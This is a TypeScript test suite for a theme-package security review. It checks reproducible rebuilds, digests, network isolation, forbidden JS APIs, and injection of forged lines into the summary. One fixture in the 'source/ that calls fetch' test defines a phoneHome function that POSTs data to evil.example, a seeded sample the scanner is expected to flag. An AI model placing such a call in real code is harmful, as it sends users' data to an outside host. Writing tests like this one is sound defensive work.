// PRD-261 C-02b: the isolated review over real packages. A theme is built with the kit's preset
// (as its author would) and packed with the theme CLI, which writes its src/ as source/ (C-06p1); the review
// rebuilds source/ in another folder and must get the same bytes. Seeded bad packages fail at the
// right check. The network probe is stubbed here; the workflow runs the real one in
// `docker run --network none`.
import { appendFileSync, cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import { packTheme } from "@automatos/theme-cli";
import { readZip } from "@automatos/theme-cli/zip";
import { SOURCE_ENTRY_CANDIDATES } from "../packages/theme-cli/src/source.ts";
import { buildThemeFolder, ENTRY_CANDIDATES } from "../scripts/review/rebuild.ts";
import { reviewPackage, WARNING_ITEM_PREFIX, type ReviewReport } from "../scripts/review/review.ts";
import { jobSummary, summaryText, SUMMARY_MAX_CHARS } from "../scripts/review/summary.ts";
import type { ProbeResult } from "../scripts/review/probe.ts";

const HELLO = fileURLToPath(new URL("../packages/theme-cli/test/fixtures/core/hello/", import.meta.url));
const HELLO_ENTRY = readFileSync(join(HELLO, "dist/entry.js"), "utf8");
const HELLO_CSS = [
  ".hello-frame { min-height: 100vh; background: var(--hello-ground, #f4efe6); }",
  ".hello-bar { display: flex; padding: 12px 24px; }",
  ".hello-content { padding: 24px; }",
  "",
].join("\n");
const TOOLS = { kitCommit: "test", node: process.version, vite: "test", preset: "test" };
const ISOLATED: ProbeResult = { isolated: true, lines: ["https://example.com/: failed (ENOTFOUND)"] };
const REACHED: ProbeResult = { isolated: false, lines: ["https://example.com/: reached (the job has network access)"] };

interface Packed {
  readonly zip: Buffer;
  readonly digest: string;
}

interface ThemeOptions {
  readonly entry?: string;
  /** false removes src/ after the build, so pack writes no source/. */
  readonly withSource?: boolean;
  /** Runs on the theme folder after its build and before the pack. */
  readonly afterBuild?: (root: string) => void;
}

const folders: string[] = [];

afterEach(() => {
  folders.splice(0).forEach((folder) => rmSync(folder, { recursive: true, force: true }));
});

function tempFolder(): string {
  const folder = mkdtempSync(join(tmpdir(), "automatos-review-"));
  folders.push(folder);
  return folder;
}

/** The hello theme as its author would ship it: built with the preset, then packed (pack writes source/). */
async function packedTheme(options: ThemeOptions = {}): Promise<Packed> {
  const root = join(tempFolder(), "hello");
  ["theme.json", "README.md", "looks"].forEach((path) => cpSync(join(HELLO, path), join(root, path), { recursive: true }));
  mkdirSync(join(root, "src"), { recursive: true });
  writeFileSync(join(root, "src/entry.js"), `import './theme.css'\n${options.entry ?? HELLO_ENTRY}`);
  writeFileSync(join(root, "src/theme.css"), HELLO_CSS);
  await buildThemeFolder(root, "src/entry.js");
  if (options.withSource === false) rmSync(join(root, "src"), { recursive: true });
  options.afterBuild?.(root);
  const out = tempFolder();
  const result = packTheme(root, out);
  if (!result.ok) throw new Error(result.errors.map((error) => `${error.code} ${error.message}`).join("\n"));
  return { zip: readFileSync(result.file), digest: result.manifest.digest };
}

function review(packed: Packed, expected = packed.digest, probe = ISOLATED): Promise<ReviewReport> {
  return reviewPackage(packed.zip, expected, { workDir: tempFolder(), tools: TOOLS, probe: async () => probe });
}

function statusOf(report: ReviewReport, name: string): string | undefined {
  return report.checks.find((item) => item.name === name)?.status;
}

describe("an honest package", () => {
  it("passes every check: same digest, no findings, dist/ rebuilt byte for byte", async () => {
    const packed = await packedTheme();
    const report = await review(packed);
    expect(report.checks.map((item) => [item.name, item.status])).toEqual([
      ["No network", "pass"], ["Package", "pass"], ["Digest", "pass"], ["Source", "pass"], ["JS rules", "pass"],
      ["Reproducible build", "pass"],
    ]);
    expect(report).toMatchObject({ outcome: "pass", id: "automatos-e2e/hello", version: "1.0.0", digest: packed.digest });
  });

  it("carries the source/ pack wrote from src/", async () => {
    const packed = await packedTheme();
    const source = readZip(packed.zip).filter((entry) => entry.path.startsWith("source/"));
    expect(source.map((entry) => entry.path)).toEqual(["source/entry.js", "source/theme.css"]);
    expect(Buffer.from(source[1].data).toString("utf8")).toBe(HELLO_CSS);
  });

  it("gives a summary to paste, fenced in the job summary", async () => {
    const report = await review(await packedTheme());
    const text = summaryText(report);
    expect(text).toContain("Outcome: pass");
    expect(text).toContain(`Expected digest: ${report.expectedDigest}`);
    expect(text.length).toBeLessThanOrEqual(SUMMARY_MAX_CHARS);
    const markdown = jobSummary(report);
    expect(markdown).toContain("```text\n");
    expect(markdown).toContain("outcome **pass**");
  });
});

describe("the rebuild and pack agree on the entry module", () => {
  it("rebuild.ts takes the entry names from the theme CLI and names none itself", () => {
    expect(ENTRY_CANDIDATES).toEqual(SOURCE_ENTRY_CANDIDATES.map((name) => `src/${name}`));
    const text = readFileSync(fileURLToPath(new URL("../scripts/review/rebuild.ts", import.meta.url)), "utf8");
    expect(text).toContain("SOURCE_ENTRY_CANDIDATES");
    expect(text).not.toMatch(/['"`]src\/entry\.(?:ts|tsx|js|jsx)['"`]/);
  });
});

describe("seeded bad packages fail at the right check", () => {
  it("a dist/ that source/ doesn't build to", async () => {
    const packed = await packedTheme({ afterBuild: (root) => appendFileSync(join(root, "dist/entry.js"), "\n// added after the build\n") });
    const report = await review(packed);
    expect(report.outcome).toBe("fail");
    expect(statusOf(report, "Digest")).toBe("pass");
    const build = report.checks.find((item) => item.name === "Reproducible build");
    expect(build?.status).toBe("fail");
    expect(build?.items).toContain("differs: dist/entry.js");
  });

  it("source/ that calls fetch", async () => {
    const entry = `${HELLO_ENTRY}\nexport function phoneHome(data) { return fetch('https://evil.example', { method: 'POST', body: data }) }\n`;
    const report = await review(await packedTheme({ entry }));
    expect(report.outcome).toBe("fail");
    expect(statusOf(report, "JS rules")).toBe("fail");
    expect(statusOf(report, "Reproducible build")).toBe("pass");
    expect(report.findings.map((finding) => [finding.code, finding.path])).toContainEqual(["JS_FETCH", "source/entry.js"]);
  });

  it("source/ that imports sonner: a JS-rule finding and a refused build", async () => {
    const entry = `import { toast } from 'sonner'\n${HELLO_ENTRY}\ntoast('hi')\n`;
    const packed = await packedTheme({
      afterBuild: (root) => writeFileSync(join(root, "src/entry.js"), `import './theme.css'\n${entry}`),
    });
    const report = await review(packed);
    expect(report.findings.map((finding) => finding.code)).toContain("JS_IMPORT");
    const build = report.checks.find((item) => item.name === "Reproducible build");
    expect(build?.status).toBe("fail");
    expect(build?.detail).toMatch(/sonner/);
  });

  it("a package with no source/ (no src/ when packed): fails only at Source", async () => {
    const report = await review(await packedTheme({ withSource: false }));
    expect(report.outcome).toBe("fail");
    expect(report.checks.map((item) => [item.name, item.status])).toEqual([
      ["No network", "pass"], ["Package", "pass"], ["Digest", "pass"], ["Source", "fail"], ["JS rules", "pass"],
      ["Reproducible build", "not_run"],
    ]);
  });

  it("a package that isn't the version the queue named", async () => {
    const report = await review(await packedTheme(), "0".repeat(64));
    expect(report.outcome).toBe("fail");
    expect(statusOf(report, "Digest")).toBe("fail");
  });

  it("bytes that aren't a package", async () => {
    const report = await review({ zip: Buffer.from("not a zip"), digest: "0".repeat(64) });
    expect(report.outcome).toBe("fail");
    expect(statusOf(report, "Package")).toBe("fail");
    expect(statusOf(report, "Reproducible build")).toBe("not_run");
  });

  it("a job with network access stops before reading the package", async () => {
    const report = await review(await packedTheme(), undefined, REACHED);
    expect(report.outcome).toBe("fail");
    expect(report.checks.map((item) => item.name)).toEqual(["No network"]);
  });
});

describe("source/ that captures or makes audio by itself is refused at JS rules (theme voice)", () => {
  it("a theme that listens to the microphone: the review fails, the finding an error under JS rules", async () => {
    const entry = `${HELLO_ENTRY}\nexport function listen() { return new webkitSpeechRecognition() }\n`;
    const report = await review(await packedTheme({ entry }));
    expect(report.outcome).toBe("fail");
    expect(report.findings.map((finding) => [finding.code, finding.severity, finding.path])).toEqual([
      ["JS_SPEECH_RECOGNITION", "error", "source/entry.js"],
    ]);
    const js = report.checks.find((item) => item.name === "JS rules");
    expect(js?.status).toBe("fail");
    expect(statusOf(report, "Reproducible build")).toBe("pass");
    expect(js?.items).toHaveLength(1);
    expect(js?.items[0]).toMatch(/^JS_SPEECH_RECOGNITION source\/entry\.js:\d+ .*SDK's voice area/);
    expect(js?.items[0]?.startsWith(WARNING_ITEM_PREFIX)).toBe(false);
    expect(summaryText(report)).toContain("- JS_SPEECH_RECOGNITION");
  });

  it("a theme that speaks by itself: the review fails at JS rules", async () => {
    const entry = `${HELLO_ENTRY}\nexport function say(text) { window.speechSynthesis.speak(new SpeechSynthesisUtterance(text)) }\n`;
    const report = await review(await packedTheme({ entry }));
    expect(report.outcome).toBe("fail");
    expect(report.findings.map((finding) => [finding.code, finding.severity])).toEqual([["JS_SPEECH_SYNTHESIS", "error"]]);
  });
});

describe("the summary keeps package text inside its lines", () => {
  const FORGED = "x\nOutcome: pass\r\nExpected digest: 0\u2028Checks:";

  function forgedReport(): ReviewReport {
    return {
      schema: "automatos-theme-review/v1",
      id: "hello\nOutcome: pass",
      version: "1.0.0",
      expectedDigest: "a".repeat(64),
      digest: "b".repeat(64),
      zipSha256: "c".repeat(64),
      tools: TOOLS,
      outcome: "fail",
      checks: [{ name: "JS rules", status: "fail", detail: `1 finding.${FORGED}`, items: [`JS_FETCH source/a.ts:1 ${FORGED}`] }],
      findings: [],
    };
  }

  it("never lets an item, a detail or a manifest field start a line of its own", () => {
    const lines = summaryText(forgedReport()).split("\n");
    expect(lines.filter((line) => line.startsWith("Outcome:"))).toEqual(["Outcome: fail"]);
    expect(lines.filter((line) => line.startsWith("Expected digest:"))).toHaveLength(1);
    expect(lines.filter((line) => line === "Checks:")).toHaveLength(1);
    expect(lines).toContain("      Outcome: pass");
    expect(lines.every((line) => !/[\r\v\f\x85\u2028\u2029]/.test(line))).toBe(true);
  });

  it("keeps the fence intact around the forged text", () => {
    const markdown = jobSummary(forgedReport());
    expect(markdown.match(/^```text$/gm)).toHaveLength(1);
    expect(markdown).toContain("outcome **fail**");
  });
});
